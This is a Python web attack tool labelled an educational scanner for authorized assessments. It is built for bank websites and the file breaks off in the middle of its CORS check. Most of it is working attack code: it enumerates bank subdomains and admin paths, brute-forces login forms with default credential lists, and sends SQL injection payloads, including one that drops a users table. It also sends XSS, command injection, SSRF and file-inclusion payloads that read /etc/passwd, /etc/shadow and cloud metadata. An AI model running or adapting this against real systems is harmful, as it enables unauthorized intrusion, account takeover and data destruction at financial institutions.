#!/usr/bin/env python3
"""
Comprehensive Web Vulnerability Scanner - Educational Pentesting Tool
For authorized security assessments only.
"""

import requests
import concurrent.futures
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import re
import sys
import time
import json
import hashlib
import threading
from queue import Queue
from datetime import datetime
import socket
import ssl
from typing import Dict, List, Tuple, Optional, Any
import logging

# Suppress SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class BankVulnScanner:
    def __init__(self, target_url: str, max_threads: int = 20, timeout: int = 10):
        self.target_url = target_url.rstrip('/')
        self.max_threads = max_threads
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        self.vulnerabilities = []
        self.discovered_urls = set()
        self.forms = []
        self.lock = threading.Lock()
        self.output_file = f"bank_vuln_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        # Common bank subdomains
        self.subdomains = [
            'www', 'login', 'online', 'secure', 'bank', 'ebank', 'ibank',
            'netbanking', 'mobile', 'app', 'portal', 'myaccount', 'dashboard',
            'payments', 'transfer', 'admin', 'backup', 'test', 'dev', 'api',
            'gateway', 'payment', 'auth', 'sso', 'corporate', 'retail',
            'services', 'support', 'help', 'status', 'cdn', 'static', 'assets'
        ]
        
        # Common login paths
        self.login_paths = [
            '/login', '/signin', '/auth', '/authenticate', '/login.php',
            '/login.html', '/admin/login', '/user/login', '/account/login',
            '/portal/login', '/secure/login', '/bank/login', '/online/login',
            '/index.php?r=site/login', '/web/login', '/sign-in', '/logon',
            '/oauth/authorize', '/saml/login', '/openid/login'
        ]
        
        # Common admin/backdoor paths
        self.admin_paths = [
            '/admin', '/administrator', '/admin.php', '/backend', '/manager',
            '/management', '/panel', '/control', '/dashboard', '/cpanel',
            '/wp-admin', '/phpmyadmin', '/phpMyAdmin', '/pma', '/mysql',
            '/console', '/shell', '/cmd', '/exec', '/backdoor', '/backup',
            '/config', '/configuration', '/.git', '/.env', '/.htaccess',
            '/web.config', '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
            '/server-status', '/server-info', '/info.php', '/phpinfo.php',
            '/test.php', '/debug', '/api/docs', '/swagger', '/api/swagger'
        ]
        
        # SQL injection payloads
        self.sqli_payloads = [
            "' OR '1'='1", "' OR 1=1--", "1' OR '1'='1'", "' UNION SELECT 1--",
            "' UNION SELECT 1,2,3--", "' AND SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--",
            "1' AND 1=1--", "1' AND 1=2--", "admin'--", "admin' OR '1'='1",
            "admin' OR '1'='1'--", "1; DROP TABLE users--", "' OR 1=1-- -",
            "' OR 1=1#", "' OR 1=1/*", "') OR ('1'='1", "') OR 1=1--",
            "' UNION ALL SELECT NULL--", "' UNION ALL SELECT NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
        ]
        
        # XSS payloads
        self.xss_payloads = [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>", "javascript:alert(1)", "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>", "';alert(1);//", "</script><script>alert(1)</script>",
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>", "\"><img src=x onerror=alert(1)>",
            "<SCRIPT>alert('XSS')</SCRIPT>", "<ScRiPt>alert(1)</sCrIpT>",
            "<IMG SRC=javascript:alert('XSS')>", "<BODY ONLOAD=alert('XSS')>",
        ]
        
        # Command injection payloads
        self.cmd_injection_payloads = [
            "; id", "| id", "|| id", "& id", "&& id", "`id`", "$(id)",
            "; ls", "| ls", "; cat /etc/passwd", "| whoami", "& ping -c 5 127.0.0.1",
            "| ping -c 5 127.0.0.1", "; ping -c 5 127.0.0.1", "& nslookup google.com",
        ]
        
        # SSRF payloads
        self.ssrf_payloads = [
            "http://127.0.0.1:80", "http://localhost:80", "http://0.0.0.0:80",
            "http://[::1]:80", "http://127.0.0.1:8080", "http://127.0.0.1:3306",
            "http://127.0.0.1:6379", "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd", "file:///etc/shadow", "gopher://localhost:6379",
            "dict://localhost:6379/info",
        ]
        
        # Open redirect payloads
        self.open_redirect_payloads = [
            "//evil.com", "https://evil.com", "//evil.com/@target.com",
            "//evil.com%2F%2Ftarget.com", "///evil.com", "https://evil.com%2Ftarget.com",
            "/\\evil.com", "/%5cevil.com",
        ]
        
        # LFI/RFI payloads
        self.lfi_payloads = [
            "/etc/passwd", "/etc/shadow", "/etc/hosts", "/proc/self/environ",
            "/proc/self/cmdline", "/proc/self/fd/0", "/proc/self/fd/1",
            "/proc/self/fd/2", "/etc/issue", "/etc/group", "/etc/network/interfaces",
            "c:\\boot.ini", "c:\\windows\\win.ini", "c:\\windows\\system32\\drivers\\etc\\hosts",
            "c:\\windows\\repair\\sam", "c:\\windows\\repair\\system",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=config.php",
            "php://filter/read=convert.base64-encode/resource=../config.php",
        ]
        
        # Common credentials for brute force
        self.common_usernames = [
            'admin', 'administrator', 'root', 'user', 'test', 'demo', 'manager',
            'supervisor', 'operator', 'system', 'service', 'support', 'info',
            'webmaster', 'postmaster', 'hostmaster', 'bank', 'banking', 'customer',
            'client', 'account', 'accounts', 'audit', 'finance', 'payments',
        ]
        
        self.common_passwords = [
            'admin', 'password', '123456', '12345678', '1234', 'qwerty',
            'letmein', 'welcome', 'monkey', 'dragon', 'master', 'sunshine',
            'princess', 'football', 'iloveyou', 'trustno1', 'passw0rd',
            'admin123', 'admin1234', 'administrator', 'root123', 'p@ssw0rd',
            'changeme', 'default', 'test123', 'demo123', 'bank123', 'banking',
            'welcome1', 'password1', 'Password1', 'Passw0rd', 'letmein123',
            'qwerty123', 'abc123', '123456789', '111111', '000000',
        ]

    def log_vulnerability(self, vuln_type: str, severity: str, url: str, payload: str, evidence: str, description: str):
        """Log discovered vulnerability"""
        vuln = {
            'type': vuln_type,
            'severity': severity,
            'url': url,
            'payload': payload,
            'evidence': evidence,
            'description': description,
            'timestamp': datetime.now().isoformat()
        }
        with self.lock:
            self.vulnerabilities.append(vuln)
            self._write_output(vuln)

    def _write_output(self, vuln: dict):
        """Write vulnerability to output file"""
        with open(self.output_file, 'a') as f:
            f.write(f"\n{'='*80}\n")
            f.write(f"[{vuln['timestamp']}] {vuln['type']} [{vuln['severity']}]\n")
            f.write(f"URL: {vuln['url']}\n")
            f.write(f"Payload: {vuln['payload']}\n")
            f.write(f"Evidence: {vuln['evidence']}\n")
            f.write(f"Description: {vuln['description']}\n")
            f.write(f"{'='*80}\n")

    def scan(self):
        """Main scan method"""
        print(f"\n[*] Starting scan of {self.target_url}")
        print(f"[*] Results will be saved to: {self.output_file}")
        
        with open(self.output_file, 'w') as f:
            f.write(f"Bank Vulnerability Scanner Report\n")
            f.write(f"Target: {self.target_url}\n")
            f.write(f"Scan Date: {datetime.now().isoformat()}\n")
            f.write(f"{'='*100}\n\n")

        threads = []
        
        # Phase 1: Reconnaissance
        print("\n[Phase 1] Reconnaissance")
        t1 = threading.Thread(target=self.subdomain_enumeration)
        t2 = threading.Thread(target=self.directory_discovery)
        t3 = threading.Thread(target=self.crawl_site)
        threads.extend([t1, t2, t3])
        
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        
        threads.clear()
        
        # Phase 2: Authentication Testing
        print("\n[Phase 2] Authentication Testing")
        t4 = threading.Thread(target=self.brute_force_login)
        threads.append(t4)
        t4.start()
        
        # Phase 3: Vulnerability Scanning
        print("\n[Phase 3] Vulnerability Scanning")
        t5 = threading.Thread(target=self.scan_sqli)
        t6 = threading.Thread(target=self.scan_xss)
        t7 = threading.Thread(target=self.scan_cmd_injection)
        t8 = threading.Thread(target=self.scan_ssrf)
        t9 = threading.Thread(target=self.scan_lfi)
        t10 = threading.Thread(target=self.scan_open_redirect)
        t11 = threading.Thread(target=self.scan_csrf)
        t12 = threading.Thread(target=self.scan_idor)
        t13 = threading.Thread(target=self.scan_security_headers)
        t14 = threading.Thread(target=self.scan_ssl_tls)
        t15 = threading.Thread(target=self.scan_cookies)
        t16 = threading.Thread(target=self.scan_cors)
        threads.extend([t5, t6, t7, t8, t9, t10, t11, t12, t13, t14, t15, t16])
        
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        
        t4.join()  # Wait for brute force to finish
        
        # Phase 4: Report Generation
        self.generate_report()
        
        print(f"\n[+] Scan complete! Results saved to: {self.output_file}")

    def subdomain_enumeration(self):
        """Enumerate subdomains"""
        print("  [+] Enumerating subdomains...")
        base_domain = urlparse(self.target_url).netloc
        
        def check_subdomain(sub):
            url = f"https://{sub}.{base_domain}"
            try:
                r = requests.get(url, timeout=self.timeout, verify=False, allow_redirects=False)
                if r.status_code != 404:
                    self.log_vulnerability(
                        "Subdomain Discovery", "Info", url, "",
                        f"Status: {r.status_code}, Content-Length: {len(r.content)}",
                        f"Discovered subdomain: {url}"
                    )
                    print(f"    Found subdomain: {url}")
            except:
                pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(check_subdomain, self.subdomains)

    def directory_discovery(self):
        """Discover hidden directories and files"""
        print("  [+] Discovering hidden paths...")
        
        def check_path(path):
            url = urljoin(self.target_url, path)
            try:
                r = self.session.get(url, timeout=self.timeout, allow_redirects=False)
                if r.status_code not in [404, 403]:
                    severity = "High" if any(x in path for x in ['.git', '.env', 'phpmyadmin', 'shell', 'backdoor', 'backup', 'console', 'cmd']) else "Medium"
                    content_sample = r.text[:200] if r.text else ""
                    self.log_vulnerability(
                        "Path Discovery", severity, url, path,
                        f"Status: {r.status_code}, Length: {len(r.content)}",
                        f"Discovered accessible path: {path}"
                    )
                    print(f"    Found: {url} [{r.status_code}]")
                    self.discovered_urls.add(url)
                    
                    # If we found login/forms, extract them
                    if r.status_code == 200 and any(x in path for x in ['login', 'sign', 'auth']):
                        self.extract_forms(url, r.text)
            except:
                pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(check_path, self.admin_paths)

    def crawl_site(self):
        """Crawl website for URLs and forms"""
        print("  [+] Crawling website...")
        
        def crawl(url, depth=0):
            if depth > 2 or url in self.discovered_urls:
                return
            self.discovered_urls.add(url)
            
            try:
                r = self.session.get(url, timeout=self.timeout)
                if r.status_code == 200:
                    self.extract_forms(url, r.text)
                    soup = BeautifulSoup(r.text, 'html.parser')
                    
                    # Extract all links
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        full_url = urljoin(self.target_url, href)
                        if self.target_url in full_url and full_url not in self.discovered_urls:
                            crawl(full_url, depth + 1)
                            
                    # Extract JavaScript files
                    for script in soup.find_all('script', src=True):
                        js_url = urljoin(self.target_url, script['src'])
                        if js_url not in self.discovered_urls:
                            self.discovered_urls.add(js_url)
                            
                    # Extract forms
                    for form in soup.find_all('form'):
                        action = form.get('action', '')
                        method = form.get('method', 'get').upper()
                        inputs = []
                        for inp in form.find_all('input'):
                            inputs.append({
                                'name': inp.get('name', ''),
                                'type': inp.get('type', 'text'),
                                'value': inp.get('value', '')
                            })
                        form_data = {
                            'url': url,
                            'action': urljoin(url, action),
                            'method': method,
                            'inputs': inputs
                        }
                        with self.lock:
                            self.forms.append(form_data)
                            
            except Exception as e:
                pass

        crawl(self.target_url)
        print(f"    Crawled {len(self.discovered_urls)} URLs, found {len(self.forms)} forms")

    def extract_forms(self, url, html):
        """Extract forms from HTML"""
        try:
            soup = BeautifulSoup(html, 'html.parser')
            for form in soup.find_all('form'):
                action = form.get('action', '')
                method = form.get('method', 'get').upper()
                inputs = []
                for inp in form.find_all('input'):
                    inputs.append({
                        'name': inp.get('name', ''),
                        'type': inp.get('type', 'text'),
                        'value': inp.get('value', '')
                    })
                form_data = {
                    'url': url,
                    'action': urljoin(url, action),
                    'method': method,
                    'inputs': inputs
                }
                with self.lock:
                    # Avoid duplicates
                    if form_data not in self.forms:
                        self.forms.append(form_data)
        except:
            pass

    def brute_force_login(self):
        """Brute force login forms"""
        print("  [+] Attempting brute force on login forms...")
        
        if not self.forms:
            print("    No forms found to brute force")
            return

        for form in self.forms:
            if any(inp['type'] in ['password', 'hidden'] or 'pass' in inp['name'].lower() for inp in form['inputs']):
                username_field = None
                password_field = None
                other_fields = []
                
                for inp in form['inputs']:
                    if inp['type'] == 'password' or 'pass' in inp['name'].lower():
                        password_field = inp['name']
                    elif inp['type'] in ['text', 'email', 'hidden'] and 'user' in inp['name'].lower() or 'email' in inp['name'].lower() or 'login' in inp['name'].lower():
                        username_field = inp['name']
                    elif inp['type'] == 'hidden':
                        other_fields.append((inp['name'], inp['value']))
                
                if not username_field:
                    # Try common username field names
                    for inp in form['inputs']:
                        if inp['type'] in ['text', 'email', 'hidden']:
                            username_field = inp['name']
                            break
                
                if username_field and password_field:
                    print(f"    Brute forcing login at: {form['action']}")
                    
                    def try_credentials(creds):
                        username, password = creds
                        data = {username_field: username, password_field: password}
                        for field_name, field_value in other_fields:
                            data[field_name] = field_value
                        
                        try:
                            r = self.session.post(form['action'], data=data, timeout=self.timeout, allow_redirects=False)
                            # Check for successful login indicators
                            if r.status_code in [302, 301]:
                                self.log_vulnerability(
                                    "Authentication Bypass", "Critical",
                                    form['action'], f"Username: {username}, Password: {password}",
                                    f"Status: {r.status_code}, Location: {r.headers.get('Location', 'N/A')}",
                                    f"Successfully logged in with credentials: {username}:{password}"
                                )
                                print(f"\n    [!] LOGIN SUCCESS: {username}:{password}")
                                print(f"    [!] Redirected to: {r.headers.get('Location', 'N/A')}")
                                return True
                            elif "error" not in r.text.lower() and len(r.text) > len(username) + len(password):
                                self.log_vulnerability(
                                    "Authentication Bypass", "Critical",
                                    form['action'], f"Username: {username}, Password: {password}",
                                    f"Status: {r.status_code}, Response length: {len(r.text)}",
                                    f"Possible login with: {username}:{password}"
                                )
                                print(f"\n    [!] Possible LOGIN: {username}:{password}")
                                return True
                        except:
                            pass
                        return False

                    # Generate credential combinations
                    creds_list = []
                    for user in self.common_usernames:
                        for pwd in self.common_passwords:
                            creds_list.append((user, pwd))
                    
                    # Also try common username/password pairs
                    common_pairs = [
                        ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
                        ('administrator', 'admin'), ('admin', 'admin123'), ('admin', 'passw0rd'),
                        ('root', 'root'), ('root', 'toor'), ('root', 'admin'),
                        ('user', 'user'), ('user', 'password'), ('test', 'test'),
                        ('demo', 'demo'), ('manager', 'manager'),
                    ]
                    creds_list.extend(common_pairs)
                    
                    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                        futures = {executor.submit(try_credentials, creds): creds for creds in creds_list}
                        for future in concurrent.futures.as_completed(futures):
                            if future.result():
                                break

    def scan_sqli(self):
        """Scan for SQL injection vulnerabilities"""
        print("  [+] Scanning for SQL injection...")
        
        for url in list(self.discovered_urls)[:50]:  # Limit to first 50 URLs
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param, values in params.items():
                original_value = values[0]
                for payload in self.sqli_payloads:
                    test_url = url.replace(f"{param}={original_value}", f"{param}={payload}")
                    try:
                        r = self.session.get(test_url, timeout=self.timeout)
                        error_indicators = [
                            "sql", "mysql", "syntax error", "unclosed quotation",
                            "odbc", "driver", "sqlite", "postgresql", "oracle",
                            "you have an error", "warning: mysql", "db2",
                            "microsoft ole db", "invalid query", "ora-",
                            "microsoft access", "jet database", "unexpected"
                        ]
                        response_lower = r.text.lower()
                        if any(indicator in response_lower for indicator in error_indicators):
                            self.log_vulnerability(
                                "SQL Injection (Error Based)", "Critical",
                                test_url, payload,
                                f"SQL error detected in response",
                                f"SQL injection vulnerability detected via error-based technique at parameter: {param}"
                            )
                            print(f"    [!] SQL Injection (Error): {test_url}")
                            break
                            
                        # Time-based detection
                        if "SLEEP" in payload:
                            elapsed = r.elapsed.total_seconds()
                            if elapsed > 4.5:
                                self.log_vulnerability(
                                    "SQL Injection (Time Based)", "Critical",
                                    test_url, payload,
                                    f"Response time: {elapsed}s",
                                    f"Time-based SQL injection vulnerability detected at parameter: {param}"
                                )
                                print(f"    [!] SQL Injection (Time): {test_url}")
                                break
                    except:
                        continue
            
            # Check form inputs
            for form in self.forms:
                for inp in form['inputs']:
                    if inp['type'] in ['text', 'email', 'search', 'textarea']:
                        for payload in self.sqli_payloads:
                            try:
                                data = {inp['name']: payload}
                                if form['method'] == 'GET':
                                    r = self.session.get(form['action'], params=data, timeout=self.timeout)
                                else:
                                    r = self.session.post(form['action'], data=data, timeout=self.timeout)
                                
                                if any(indicator in r.text.lower() for indicator in ['sql', 'syntax error', 'unclosed quotation', 'mysql_fetch', 'ora-']):
                                    self.log_vulnerability(
                                        "SQL Injection (Form)", "Critical",
                                        form['action'], payload,
                                        f"SQL error detected in form response for field: {inp['name']}",
                                        f"SQL injection vulnerability in form field: {inp['name']}"
                                    )
                                    print(f"    [!] SQL Injection (Form): {form['action']} field: {inp['name']}")
                                    break
                            except:
                                continue

    def scan_xss(self):
        """Scan for Cross-Site Scripting vulnerabilities"""
        print("  [+] Scanning for XSS...")
        
        for url in list(self.discovered_urls)[:30]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param, values in params.items():
                original_value = values[0]
                for payload in self.xss_payloads:
                    if param == 'redirect' or param == 'next':
                        continue
                    test_url = url.replace(f"{param}={original_value}", f"{param}={payload}")
                    try:
                        r = self.session.get(test_url, timeout=self.timeout)
                        if payload in r.text:
                            self.log_vulnerability(
                                "Cross-Site Scripting (XSS)", "High",
                                test_url, payload,
                                f"Payload reflected in response: {payload[:50]}",
                                f"Reflected XSS vulnerability detected at parameter: {param}"
                            )
                            print(f"    [!] XSS: {test_url}")
                            break
                    except:
                        continue

        # Check form inputs for XSS
        for form in self.forms:
            for inp in form['inputs']:
                if inp['type'] in ['text', 'email', 'search', 'textarea']:
                    for payload in self.xss_payloads:
                        try:
                            data = {inp['name']: payload}
                            if form['method'] == 'GET':
                                r = self.session.get(form['action'], params=data, timeout=self.timeout)
                            else:
                                r = self.session.post(form['action'], data=data, timeout=self.timeout)
                            
                            if payload in r.text:
                                self.log_vulnerability(
                                    "Cross-Site Scripting (XSS - Form)", "High",
                                    form['action'], payload,
                                    f"Payload reflected in form response: {payload[:50]}",
                                    f"Reflected XSS vulnerability in form field: {inp['name']}"
                                )
                                print(f"    [!] XSS (Form): {form['action']} field: {inp['name']}")
                                break
                        except:
                            continue

    def scan_cmd_injection(self):
        """Scan for Command Injection vulnerabilities"""
        print("  [+] Scanning for Command Injection...")
        
        for url in list(self.discovered_urls)[:30]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param, values in params.items():
                original_value = values[0]
                for payload in self.cmd_injection_payloads:
                    test_url = url.replace(f"{param}={original_value}", f"{param}={payload}")
                    try:
                        r = self.session.get(test_url, timeout=self.timeout)
                        cmd_indicators = [
                            "uid=", "gid=", "root:", "bin:", "daemon:", "www-data:",
                            "total ", "drwxr", "-rw-r", "root:x:", "nobody:",
                        ]
                        if any(indicator in r.text for indicator in cmd_indicators):
                            self.log_vulnerability(
                                "Command Injection", "Critical",
                                test_url, payload,
                                f"Command output detected in response",
                                f"Command injection vulnerability at parameter: {param}"
                            )
                            print(f"    [!] Command Injection: {test_url}")
                            break
                    except:
                        continue

    def scan_ssrf(self):
        """Scan for Server-Side Request Forgery"""
        print("  [+] Scanning for SSRF...")
        
        for url in list(self.discovered_urls)[:30]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param, values in params.items():
                original_value = values[0]
                for payload in self.ssrf_payloads:
                    if any(x in param.lower() for x in ['url', 'path', 'file', 'redirect', 'return', 'next', 'goto', 'target', 'dest', 'destination', 'host']):
                        test_url = url.replace(f"{param}={original_value}", f"{param}={payload}")
                        try:
                            r = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                            if r.status_code != 404 and len(r.content) > 0:
                                self.log_vulnerability(
                                    "Server-Side Request Forgery (SSRF)", "High",
                                    test_url, payload,
                                    f"Status: {r.status_code}, Length: {len(r.content)}",
                                    f"Potential SSRF vulnerability at parameter: {param}"
                                )
                                print(f"    [!] SSRF: {test_url}")
                        except:
                            continue

    def scan_lfi(self):
        """Scan for Local/Remote File Inclusion"""
        print("  [+] Scanning for LFI/RFI...")
        
        for url in list(self.discovered_urls)[:30]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param, values in params.items():
                original_value = values[0]
                for payload in self.lfi_payloads:
                    if any(x in param.lower() for x in ['file', 'path', 'include', 'page', 'dir', 'document', 'folder', 'root', 'load', 'read', 'content', 'template']):
                        test_url = url.replace(f"{param}={original_value}", f"{param}={payload}")
                        try:
                            r = self.session.get(test_url, timeout=self.timeout)
                            lfi_indicators = [
                                "root:", "bin:", "daemon:", "nobody:", "uid=",
                                "gid=", "[boot loader]", "[fonts]", "[extensions]",
                                "system32", "windows", "<?php", "<?",
                                "localhost", "127.0.0.1", "SERVER_ADDR",
                            ]
                            if any(indicator in r.text for indicator in lfi_indicators):
                                self.log_vulnerability(
                                    "File Inclusion (LFI/RFI)", "Critical",
                                    test_url, payload,
                                    f"LFI indicator found in response",
                                    f"File inclusion vulnerability at parameter: {param}"
                                )
                                print(f"    [!] LFI/RFI: {test_url}")
                                break
                        except:
                            continue

    def scan_open_redirect(self):
        """Scan for Open Redirect vulnerabilities"""
        print("  [+] Scanning for Open Redirect...")
        
        for url in list(self.discovered_urls)[:30]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param, values in params.items():
                if any(x in param.lower() for x in ['redirect', 'return', 'next', 'goto', 'url', 'link', 'target', 'dest', 'destination', 'to', 'out']):
                    for payload in self.open_redirect_payloads:
                        original_value = values[0]
                        test_url = url.replace(f"{param}={original_value}", f"{param}={payload}")
                        try:
                            r = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                            location = r.headers.get('Location', '')
                            if 'evil' in location.lower() or r.status_code in [301, 302, 303, 307, 308]:
                                self.log_vulnerability(
                                    "Open Redirect", "Medium",
                                    test_url, payload,
                                    f"Redirect to: {location}",
                                    f"Open redirect vulnerability at parameter: {param}"
                                )
                                print(f"    [!] Open Redirect: {test_url}")
                        except:
                            continue

    def scan_csrf(self):
        """Check for CSRF vulnerabilities"""
        print("  [+] Checking for CSRF vulnerabilities...")
        
        for form in self.forms:
            csrf_token_found = False
            for inp in form['inputs']:
                if any(x in inp['name'].lower() for x in ['csrf', 'token', 'nonce', '_token', 'authenticity_token', 'xsrf']):
                    csrf_token_found = True
                    break
            
            if not csrf_token_found:
                self.log_vulnerability(
                    "Cross-Site Request Forgery (CSRF)", "High",
                    form['url'], f"Form action: {form['action']}",
                    f"No CSRF token found in form",
                    f"CSRF vulnerability - form lacks anti-CSRF tokens"
                )
                print(f"    [!] CSRF: {form['url']}")

    def scan_idor(self):
        """Scan for Insecure Direct Object References"""
        print("  [+] Scanning for IDOR...")
        
        idor_patterns = [
            r'/user/(\d+)', r'/account/(\d+)', r'/profile/(\d+)', r'/transaction/(\d+)',
            r'/order/(\d+)', r'/invoice/(\d+)', r'/document/(\d+)', r'/file/(\d+)',
            r'download\.php\?id=(\d+)', r'file\.php\?id=(\d+)', r'view\.php\?id=(\d+)',
            r'profile\.php\?id=(\d+)', r'user\.php\?id=(\d+)', r'account\.php\?id=(\d+)',
            r'id=(\d+)', r'user_id=(\d+)', r'account_id=(\d+)',
        ]
        
        for url in list(self.discovered_urls)[:50]:
            for pattern in idor_patterns:
                match = re.search(pattern, url, re.IGNORECASE)
                if match:
                    original_id = match.group(1)
                    # Test with incremented ID
                    test_id = str(int(original_id) + 1)
                    test_url = url.replace(f"{original_id}", test_id)
                    try:
                        r = self.session.get(test_url, timeout=self.timeout)
                        if r.status_code == 200:
                            self.log_vulnerability(
                                "Insecure Direct Object Reference (IDOR)", "High",
                                test_url, f"ID: {test_id}",
                                f"Accessed resource with different ID: {test_id}",
                                f"IDOR vulnerability - able to access resource with modified ID"
                            )
                            print(f"    [!] IDOR: {test_url}")
                    except:
                        continue

    def scan_security_headers(self):
        """Check for missing security headers"""
        print("  [+] Checking security headers...")
        
        try:
            r = self.session.get(self.target_url, timeout=self.timeout)
            headers = r.headers
            
            security_headers = {
                'Strict-Transport-Security': 'HTTP Strict Transport Security (HSTS)',
                'Content-Security-Policy': 'Content Security Policy (CSP)',
                'X-Content-Type-Options': 'X-Content-Type-Options (nosniff)',
                'X-Frame-Options': 'Clickjacking Protection (X-Frame-Options)',
                'X-XSS-Protection': 'X-XSS-Protection header',
                'Referrer-Policy': 'Referrer Policy',
                'Permissions-Policy': 'Permissions Policy (Feature Policy)',
                'Set-Cookie': 'Secure/HttpOnly cookie flags (check individual cookies)',
            }
            
            for header, description in security_headers.items():
                if header not in headers:
                    severity = "High" if header in ['Strict-Transport-Security', 'Content-Security-Policy', 'X-Frame-Options'] else "Medium"
                    self.log_vulnerability(
                        f"Missing Security Header", severity,
                        self.target_url, header,
                        f"Missing header: {header}",
                        f"Missing {description} header"
                    )
                    print(f"    [!] Missing Security Header: {header}")
            
            # Check for Server information disclosure
            if 'Server' in headers:
                self.log_vulnerability(
                    "Information Disclosure", "Low",
                    self.target_url, headers['Server'],
                    f"Server header: {headers['Server']}",
                    f"Server version disclosure: {headers['Server']}"
                )
                print(f"    [!] Server info disclosed: {headers['Server']}")
                
            if 'X-Powered-By' in headers:
                self.log_vulnerability(
                    "Information Disclosure", "Low",
                    self.target_url, headers['X-Powered-By'],
                    f"X-Powered-By header: {headers['X-Powered-By']}",
                    f"Technology disclosure: {headers['X-Powered-By']}"
                )
                
        except Exception as e:
            print(f"    Error checking headers: {e}")

    def scan_ssl_tls(self):
        """Check SSL/TLS configuration"""
        print("  [+] Checking SSL/TLS configuration...")
        
        hostname = urlparse(self.target_url).hostname
        port = urlparse(self.target_url).port or 443
        
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Check SSL version
            for version in [ssl.PROTOCOL_TLSv1, ssl.PROTOCOL_TLSv1_1, ssl.PROTOCOL_TLSv1_2]:
                try:
                    ssl.SSLContext(version)
                except:
                    pass
            
            with socket.create_connection((hostname, port), timeout=self.timeout) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cipher = ssock.cipher()
                    self.log_vulnerability(
                        "SSL/TLS Configuration", "Info",
                        self.target_url, f"Cipher: {cipher[0]}, Version: {cipher[1]}",
                        f"SSL/TLS connection established using {cipher[1]}",
                        f"SSL/TLS configured - Version: {cipher[1]}, Cipher: {cipher[0]}"
                    )
                    
                    # Check for weak ciphers (simplified)
                    weak_ciphers = ['RC4', 'DES', '3DES', 'MD5', 'EXPORT', 'NULL']
                    if any(weak in cipher[0] for weak in weak_ciphers):
                        self.log_vulnerability(
                            "Weak SSL/TLS Cipher", "High",
                            self.target_url, cipher[0],
                            f"Weak cipher in use: {cipher[0]}",
                            f"Bank uses weak SSL/TLS cipher: {cipher[0]}"
                        )
                        print(f"    [!] Weak Cipher: {cipher[0]}")
                        
        except Exception as e:
            self.log_vulnerability(
                "SSL/TLS Error", "Medium",
                self.target_url, str(e),
                f"SSL/TLS connection error: {str(e)}",
                f"SSL/TLS connection issue detected"
            )

    def scan_cookies(self):
        """Check cookie security"""
        print("  [+] Checking cookie security...")
        
        try:
            r = self.session.get(self.target_url, timeout=self.timeout)
            
            for cookie in self.session.cookies:
                cookie_issues = []
                
                # Check Secure flag
                if not cookie.secure:
                    cookie_issues.append("Missing Secure flag")
                    
                # Check HttpOnly flag
                if not cookie.has_nonstandard_attr('HttpOnly') and not cookie.rest.get('HttpOnly'):
                    # Actually, check differently - requests doesn't store HttpOnly
                    set_cookie = r.headers.get('Set-Cookie', '')
                    if cookie.name in set_cookie and 'httponly' not in set_cookie.lower():
                        cookie_issues.append("Missing HttpOnly flag")
                
                # Check SameSite
                if 'samesite' not in set_cookie.lower():
                    cookie_issues.append("Missing SameSite attribute")
                
                if cookie_issues:
                    self.log_vulnerability(
                        "Insecure Cookie", "High",
                        self.target_url, f"Cookie: {cookie.name}",
                        f"Issues: {', '.join(cookie_issues)}",
                        f"Cookie '{cookie.name}' has security issues: {', '.join(cookie_issues)}"
                    )
                    print(f"    [!] Insecure Cookie: {cookie.name} - {', '.join(cookie_issues)}")
                    
        except Exception as e:
            pass

    def scan_cors(self):
        """Check CORS misconfiguration"""
        print("  [+] Checking CORS configuration...")
        
        malicious_origins = [
            'https://evil.com', 'null', 'https://attacker.com',
            'https://evil-bank.com', 'https://bank.evil.com'
        ]
        
        for origin in malicious_origins:
            try:
                headers = {
                    'Origin': origin,
                    'User-Agent': self.session.headers['User-Agent']
                }
                r = self.session.get(self.target_url, headers=headers, timeout=self.timeout)
                
                cors_headers = {
                    'Access-Control-Allow-Origin': r.headers.get('Access-Control-Allow-Origin', ''),
                    'Access-Control-Allow-Credentials': r.headers.get('Access-Control-Allow-Credentials', ''),
                }
                
                if cors_headers['Access-Control-Allow-Origin'] == '*' or cors_headers['Access-Control-Allow-Origin'] == origin:
                    severity = "Critical" if cors_headers.get('Access-Control-Allow-Credentials') == 'true' else "High"
                    self.log_vulnerability(
                        "CORS Misconfiguration", severity,
                        self.target_url, f"Origin: {origin}",
                        f"CORS allows origin: {cors_headers['Access-Control-Allow-Origin']}, Credentials: {cors_headers.get('Access-Control-Allow-Credentials', 'N/A')}",
